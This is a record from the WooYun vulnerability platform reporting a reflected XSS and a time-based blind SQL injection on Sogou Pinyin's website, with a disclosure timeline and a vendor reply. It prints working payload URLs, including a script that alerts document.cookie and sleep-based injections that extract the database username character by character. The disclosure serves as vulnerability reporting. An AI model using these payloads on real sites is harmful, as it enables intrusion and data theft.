{"id": 852, "wybug_id": "wooyun-2014-073682", "wybug_title": "搜狗拼音一处SQL盲注及反射型XSS", "wybug_corp": "搜狗", "wybug_author": "lijiejie", "wybug_date": "2014-08-24 16:32", "wybug_open_date": "2014-10-08 16:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向公众公开  简要描述： 搜狗拼音一处SQL盲注、及一处反射型XSS 详细说明：  反射型XSS一枚，建议再找找存储型的:http://pinyin.sogou.com//wurehanzi/libs/Pagination/examples/ArrayData.php?page=1'%22()%26%25<ScRiPt%20>alert(document.cookie)</ScRiPt>盲注点，参数eidhttp://pinyin.sogou.com/wurehanzi/digg.php?ac=digg&digg=1&eid=if(length(user())>22,sleep(1),0)其他有问题的页面,麻烦复查：pinyin.sogou.com/wurehanzi/get_ajax_data.php?wordnum=1pinyin.sogou.com/wurehanzi/post.php.htaccess文件可下载：/wurehanzi/libs/Pagination/examples/.htaccess   漏洞证明：  猜解到user的长度为23。第一个字母ascii码是105，是字母i：http://pinyin.sogou.com/wurehanzi/digg.php?ac=digg&digg=1&eid=if(ascii(mid(user(),1,1))=105,sleep(2),0)chr(105) = 'i'chr(109) = 'm'chr(101) = 'e'chr(95) = '_'chr(115) = 's'chr(107) = 'k'chr(105) = 'i'chr(110) = 'n'chr(115) = 's'好了，就猜解到这里，用户名应该是ime_skin再加点什么，不管了，赶紧提过来啊\n\n   修复方案：  可能搜狗的兄弟忘记这些细微的点了。。。 我是点开你们的弹窗发现的。。。   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-08-25 14:35 厂商回复： 感谢支持，欢迎到SGSRC平台提交漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}